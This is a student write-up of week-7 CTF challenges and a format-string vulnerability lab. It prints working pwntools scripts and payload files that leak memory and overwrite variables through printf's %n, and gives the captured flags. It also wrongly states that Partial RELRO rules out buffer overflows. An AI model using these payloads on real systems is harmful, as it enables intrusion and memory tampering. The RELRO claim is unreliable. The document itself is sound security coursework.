# Trabalho realizado na semana #7

## CTF 

### Week 7 - Challenge 1

After executing <kbd>checksec program</kbd> we got the following output:

![](https://i.imgur.com/UeyzYy1.png)

We noticed that this program has Partial RELRO. This means there is no risk of a buffer overflow.
There is also a stack canary, meaning a stack buffer overflow will be detected before execution of a malicious code can occur.
Because NX is enabled, attackers are prevented from being able to jump to custom shellcode that they've stored on the stack or in a global variable. 
There is no PIE so ROP attacks aren't difficulted.

After exploring the source code, we found some important information:

- In line 27, a user input is printed, and the user has control over the first argument of printf leading to memory leaks vulnerabilities like reading or changing the value of variables.

![](https://i.imgur.com/ua2btyo.png)

- Using gdb we found the address of the flag

![](https://i.imgur.com/ghDYYM4.png)

After this, we used printf function to make a format string attack and altered the following pyhton code to get the flag:

```
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\x60\xc0\x04\x08%s")
p.interactive()
```
flag:
```
flag{5c1a043f0fca299a77b701282ef08c70}
```
### Week 7 - Challenge 2

After executing <kbd>checksec program</kbd> we got the same output as the previous challenge, so we already knew what we were dealing with:

![](https://i.imgur.com/UeyzYy1.png)

After exploring the source code, we found some important information:

- We need to change the value of the global variable, key, to <kbd>0xbeef</kbd> in order to open up a bash which we will use to get the flag using <kbd>cat flag.txt</kbd>

Using gdb we found the address of the key value:

![](https://i.imgur.com/vu53j8G.png)

We needed to use a format string attack but with some changes. 

We needed to write an integer value to match 0xbeef. We know 0xbeef is 48879 in decimal, and this is the value that the key variable must have.

In printf function, <kbd> %n is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of %n - GeeksForGeeks </kbd>.  We figured we could use this feature to store the wanted value in the key variable. 

First, we write the 4 bytes for the key address.

Then the remaining 48875 bytes will be filled using the %x format specifier with a fixed width. With %[width]x -> %48875x, the program will read 48875 bytes and will try to print them. 

Lastly, the specifier %n will stop it from printing those bytes, but will still count them, so the value stored in the address will be the value that we want.

Using the following code, we are able to achieve that:

```
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4005)

p.recvuntil(b"here...")
p.sendline(b"\x34\xc0\x04\x08%48875x%1$n")
p.interactive()
```

After obtaining control of the shell, we used <kbd>cat flag.txt</kbd> to extract the flag:

![](https://i.imgur.com/LEyGiOt.png)


flag:
```
flag{b1045624ae7805ba668a4ea1486288dd}
```

## Format-String Vulnerability Lab

### Task 1

To crash our program, we created a file, file.txt, with the following contents:

```
"%s"*1000
```
Because our program will try to read 1000 strings from the stack and these values are not valid memory addresses, it will cause a segmentation fault crashing the program as expected.

![](https://i.imgur.com/Z6w7eCL.png)


### Task 2 

#### 2.A 

Knowing that <kbd>"AAAA"</kbd> represents <kbd>41414141</kbd> in hexadecimal, we simply had to look for this value in our output to know exactly how many %x format specifiers we needed. After experimenting, we ended up realizing that we needed 64 %x format specifiers to print out our input.

We created file1.txt with the following contents to solve this task:

```
AAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
```

![](https://i.imgur.com/09MZsTT.png)


#### 2.B

To get the value of the secret message stored in the heap area we created the following python script to build our file, badfile:

```
import sys

content = (0x080b4008).to_bytes(4,byteorder='little') + ("%64$s").encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
From the server output we know the secret message's address is <kbd>0x080b4008</kbd>. We also know that by sending a "%s", printf function will try to read a string from an address. 
In the previous task we learned that the number of %x we need to get to the beginning of the stack is 64, therefore, we can specify which address we want to print by adding an offset of 64 between % and s. 
This way, our program will read a string from the address written in the 64th position in the stack which will be the secret message's address.

![](https://i.imgur.com/3fNAREi.png)

After examining the output, the secret message is:

```
A secret message
```


### Task 3

#### 3.A

To change the value of the target variable's address that is defined in the server program, we created the following python script to build our file, badfile:

```
import sys

content = (0x080e5068).to_bytes(4,byteorder='little') + ("%64$n").encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Like in the previous task, we looked up the target's variable address in the server output, getting <kbd>0x080e5068</kbd>. 
This time, we added a %n in the format specifier because %n <kbd>"is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of %n" - GeeksforGeeeks. </kbd> The number of bytes written so far are 4, because of the address, so this number will be the one stored in the target variable's address. 

![](https://i.imgur.com/HvYgU1z.png)

After examining the server output, we can see the target variable's value (after) has been successfully changed to <kbd>0x00000004</kbd>

#### 3.B

In order to change the content to a specific value <kbd>0x5000</kbd>, we built our script the same way with some changes. We created the following python script to build our file, badfile:

```
import sys

content = (0x080e5068).to_bytes(4,byteorder='little') + ("%20476x%64$n").encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

We know 0x5000 is 20480 in decimal, but we cannot simply write 20480 bytes to the file, as we know from task one that the server will accept up to 1500 bytes from us. 

First, we write the 4 bytes for the address.

Then the remaining 20476 bytes will be filled using the %x format specifier with a fixed width. With %[width]x -> %20476x, the program will read 20476 bytes and will try to print them. 

Lastly, the specifier %n will stop it from printing those bytes, but will still count them, so the value stored in the address will be the value that we want.

```
Starting server-10.9.0.5 ... done
Starting server-10.9.0.6 ... done
Attaching to server-10.9.0.5, server-10.9.0.6
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd720
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 16 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd648
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | (*)The target variable's value (after):  0x00005000
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

After examining the server output, we can see the target variable's value (after) has been successfully changed to <kbd>0x00005000</kbd>

(*) - In the server output, because %n prints empty spaces, the output printed lots of empty space. This was removed for brevity.
